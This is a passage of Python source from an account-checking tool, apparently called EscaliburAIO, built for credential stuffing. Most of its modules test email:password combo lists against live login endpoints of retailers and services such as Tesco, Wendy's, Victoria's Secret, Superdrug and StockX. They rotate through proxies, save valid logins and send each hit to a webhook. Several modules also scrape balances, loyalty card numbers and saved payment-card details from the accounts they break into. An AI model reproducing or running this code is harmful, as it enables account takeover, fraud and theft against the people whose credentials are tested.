                content = "credentialToken=&nonce=YoNQgnneGbJrpnSBsVYvZeMwBiFOrJhR&sT=&6d04c49c={}&a23a3980={}&jsE=v1-06a148bf127bc6a2fdff9e7fb6fe55b94f3fbe1a&duration=604800".format(email, password)

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                r = sess.post("https://www.ovh.com/auth/", headers=headers, data=content)

                if "Invalid Account ID or password</span>"  in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "Not Acceptable" or "Please enter the code you received by email" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=ovh_fr_check, args=(email,password, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=ovh_fr_check, args=(email,password, proxylist,)).start()
    def ovh_fr():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="OVH-FR"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=ovh_fr_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def zippyshare_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://www.zippyshare.com/services/login" 
                content = f"login={email}&pass={password}" 

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "Logout" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif r.url == "https://www.zippyshare.com/?invalid=1":
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=zippyshare_check, args=(email,password, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=zippyshare_check, args=(email,password, proxylist,)).start()
    def zippyshare():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="ZippyShare"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=zippyshare_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def Wish_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://www.wish.com/api/email-login" 

                headers = {
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "Accept":"application/json, text/javascript, */*; q=0.01", 
                    "origin":"https://www.wish.com", 
                    "referer":"https://www.wish.com/", 
                    "X-Requested-With":"XMLHttpRequest", 
                    "host":"www.wish.com" 
                }

                f = sess.get(url, headers=headers)

                xrsf = f.cookies.get("_xsrf")

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "Accept":"application/json, text/javascript, */*; q=0.01", 
                    "origin":"https://www.wish.com", 
                    "referer":"https://www.wish.com/", 
                    "X-Requested-With":"XMLHttpRequest" ,
                    "host":"www.wish.com", 
                    "X-XSRFToken":xrsf
                }
                content = f"email={email}&password={password}&_buckets=&_experiments=" 

                r = sess.post("https://www.wish.com/api/email-login", headers=headers, data=content)
                if "Email or Password is incorrect" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "{\"msg\"\":\"\"\", \"code\"\":v\"0, \"data\"\":\"{\"signup_flow_pages\"\":\"[], \"session_token\"\":\""  in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    url = "https://www.wish.com/cash"
                    headers = {
                        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                        "Pragma":"no-cache", 
                        "Accept":"*/*" 
                    } 
                    f = sess.get(url, headers=headers)
                    balance = search(r'\", \"wish_cash_balance\": \"(.*?)\",', str(f.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Balance: {} |\n".format(email, password, balance))
                else:
                    threading.Thread(target=Wish_check, args=(email,password, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=Wish_check, args=(emails, passwords, proxylist,)).start()
    def Wish():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Wish"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Wish_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def wendy_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://services.wendys.com/CustomerServices/rest/login?lang=en&cntry=US&sourceCode=MY_WENDYS&version=5.6.6"
                content = {"password":password,"login":email,"deviceId":"EF6EA2C0-AC71-4A9B-B81B-889E402A17FE","keepSignedIn":"true","lng":"0","lat":"0"}

                headers = {
                    "Content-Type":"application/json", 
                    "Accept":"*/*", 
                    "User-Agent":"Wendys/5.6.6 (iPhone; iOS 10.2.1; Scale/1.00)", 
                    "Pragma":"no-cache" 
                }

                r = sess.post(url, json=content, headers=headers, allow_redirects=True)
                if "If you're having trouble logging in, try resetting your password" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "<token>" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    token = search(r'<token>(.*?)</token>', str(r.text)).group(1)
                    url = "https://services.wendys.com/CustomerServices/rest/balance/prepaid?lang=en&cntry=US&sourceCode=MY_WENDYS&version=5.6.6"
                    headers = {
                        "Content-Type":"application/json", 
                        "Accept":"*/*", 
                        "User-Agent":"Wendys/5.6.6 (iPhone; iOS 10.2.1; Scale/1.00)", 
                        "Pragma":"no-cache" 
                    }
                    content = {"lng":"0","deviceId":"EF6EA2C0-AC71-4A9B-B81B-889E402A17FE","lat":"0","token":token}
                    f = sess.post(url, json=content, headers=headers)
                    balance = search(r'<amount>(.*?)</amount>', str(f.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Balance: {} |\n".format(email, password, balance))
                else:
                    threading.Thread(target=wendy_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=wendy_check, args=(emails, passwords, proxylist,)).start()
    def wendy():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Wendy"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=wendy_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def victoriasecret_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://www.victoriassecret.com/account/signin"
                content = ""

                headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "Accept":"*/*", 
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                "Pragma":"no-cache" 
                }

                f = sess.get(url, data=content, headers=headers)

                url = "https://www.victoriassecret.com/account/logon"
                content = f"loginredirect=&overlay=&j_username={email}&j_password={password}&screenname=Your+Account" 

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "Upgrade-Insecure-Requests":"1", 
                    "Referer":"https://www.victoriassecret.com/", 
                    "Origin":"https://www.victoriassecret.com" 
                }
                r = sess.get(url, data=content, headers=headers)

                url = "https://www.victoriassecret.com/account/signin"
                content = ""
                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache" 
                }
                x = sess.get(url, data=content, headers=headers)

                if "Sign In" in x.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "Sign Out" in x.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    payment_method = search(r'<div class=\"cardInfo\">(.*?)</div>', str(x.text)).group(1)
                    card2_method = search(r'<div class=\"cardInfo\">(.*?)</div>', str(x.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Payment-Method: {} | Card: {} |\n".format(email, password, payment_method, card2_method))
                else:
                    threading.Thread(target=victoriasecret_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=victoriasecret_check, args=(emails, passwords, proxylist,)).start()
    def victoriasecret():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Victoria secret"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=victoriasecret_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def thebodyshop_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                headers = {
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                f = sess.get("https://www.thebodyshop.com/en-gb/login", headers=headers)
                csrf = search(r'CSRFToken\" value=\"(.*?)\" />', str(f.text)).group(1)

                url = "https://www.thebodyshop.com/en-gb/j_spring_security_check" 

                content = f"j_username={email}&j_password={password}&captchaVerificationRequired=&submit-login=&fromAcc=true&CSRFToken={csrf}" 

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" ,
                    "Pragma":"no-cache" ,
                    "Accept":"*/*" ,
                    "Upgrade-Insecure-Requests":"1" ,
                    "Referer":"https://www.thebodyshop.com/en-gb/my-account/home" 
                }
                r = sess.post(url, data=content, headers=headers)

                if "Incorrect credentials"  in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "My Rewards<span>" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    points = search(r'My Points<span>(.*?)</span>', str(r.text)).group(1)
                    rewards = search(r'My Rewards<span> (.*?)</span>', str(r.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Points: {} | Rewards: {} |\n".format(email, password, points, rewards))
                else:
                    threading.Thread(target=thebodyshop_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=thebodyshop_check, args=(emails, passwords, proxylist,)).start()
    def thebodyshop():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="TheBodyShop"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=thebodyshop_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def tesco_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://secure.tesco.com/account/en-GB/login?from=/" 

                headers = {
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                f = sess.get(url, headers=headers)

                csrf = search(r'csrfToken\":\"(.*?)\",\\', str(f.text)).group(1)
                state = search(r'state\" value=\"(.*?)\\', str(f.text)).group(1)

                url = "https://secure.tesco.com/account/en-GB/login?from=/"

                content = f"username={email}&password={password}&state={state}&_csrf={csrf}" 

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "Upgrade-Insecure-Requests":"1" 
                }
                r = sess.post(url, data=content, headers=headers, allow_redirects=True)
                if "Unfortunately we do not recognise those details. "  in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "Found. Redirecting to" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=tesco_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=tesco_check, args=(emails, passwords, proxylist,)).start()
    def tesco():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Tesco"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=tesco_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def superdrug_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://appsd.superdrug.com/rest/oauth/token" 

                content = f"username={email}&password={password}&grant_type=password&client_id=mobile_android&client_secret=secret"

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }
                r = sess.post(url, data=content, headers=headers)

                if "refreshToken\"\":\"{" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    csrf = search(r'\"value\"":"\"(.*?)\",', str(r.text)).group(1)
                    url = "https://appsd.superdrug.com/rest/superdrug/customers/current/loyalty" 
                    headers = {
                        "User-Agent":"okhttp/3.10.0",
                        "Pragma":"no-cache", 
                        "Accept":"*/*", 
                        "Authorization":f"Bearer {csrf}" 
                    }
                    f = sess.get(url, headers=headers)
                    points = search(r'\"points\": \"(.*?)\"', str(f.text)).group(1)
                    card_number = search(r'\"cardNumber\": \"(.*?)\"', str(f.text)).group(1)
                    pointscashvalue = search(r'pointsCashValue\": \"(.*?)\",', str(f.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Points: {} | Card-Number: {} | Points-Cash-Value: {} |\n".format(email, password, points, card_number, pointscashvalue))
                elif "detailMessage\"\":\"\"Bad credentials" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=superdrug_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=superdrug_check, args=(emails, passwords, proxylist,)).start()
    def superdrug():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="SuperDrug"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=superdrug_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def stocx_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://gateway.stockx.com/api/v1/login" 

                content = {"email":email,"flagged":"false","hasBuyerReward":"false","hidePortfolioBanner":"false","id":"0","isActive":"false","isBuying":"false","isSelling":"false","password":password,"securityOverride":"false","teamMember":"false"}

                headers = {
                "Content-Type":"application/json; charset=UTF-8", 
                "x-api-key":"zWW9iZmfu02CDfd9bCWnZ29mKLgHC9AJ5kjUHvVq", 
                "App-Platform":"android", 
                "App-Version":"4.0.1", 
                "X-Anonymous-ID":"11cbb734-2fe7-4d94-8994-e3605330adc6", 
                "Accept-Language":"en-us", 
                "Content-Length":"234", 
                "Host":"gateway.stockx.com",
                "Connection":"close", 
                "Accept-Encoding":"gzip, deflate", 
                "User-Agent":"okhttp/3.14.1" 
                }

                r = sess.post(url, headers=headers, json=content)
                if "{\"Customer\":{\"id\":\"" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Incorrect email or password." in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=stocx_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=stocx_check, args=(emails, passwords, proxylist,)).start()
    def stocx():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="StockX"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=stocx_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def silvertv_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://api.sliver.tv/v1/user/auth" 

                content = {"email_or_username":email,"password":password}

                headers = {
                    "Content-Type":"application/json; charset=UTF-8", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "X-App-Version":"4", 
                    "X-Platform":"web"  
                }

                r = sess.post(url, headers=headers, json=content)
                if "Invalid login credentials" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
